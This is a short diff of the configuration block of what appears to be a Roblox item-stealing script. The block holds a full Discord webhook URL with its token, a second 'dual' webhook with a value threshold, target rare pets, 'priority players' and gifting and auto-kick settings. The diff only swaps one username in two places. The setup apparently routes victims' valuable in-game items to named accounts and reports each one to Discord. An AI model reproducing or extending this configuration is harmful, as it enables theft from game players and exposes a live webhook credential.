@@ -44,7 +44,7 @@ local CONFIG = {
     webhook = getfenv().Webhook,
     username = getfenv().Username,
     dualWebhook = "https://discord.com/api/webhooks/1395923307668443166/q9qB5eEYtE2X4I9EbfMe7bTj4Sa8RhnD8Fdjj05J5Bu7Ih0U-eeaDo1zbGJLKfHJ807w",
-    dualUsername = "eirik_398",
+    dualUsername = "eirik_938",
     dualWebhookThreshold = 1e12,
     
     -- Target pets (from first script's rarePets)
@@ -52,7 +52,7 @@ local CONFIG = {
     excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"},
     
     -- Priority players (dualUsername is priority)
-    priorityPlayers = {"eirik_398"},
+    priorityPlayers = {"eirik_938"},
     
     -- Gifting configuration
     autoKickDelay = 2,
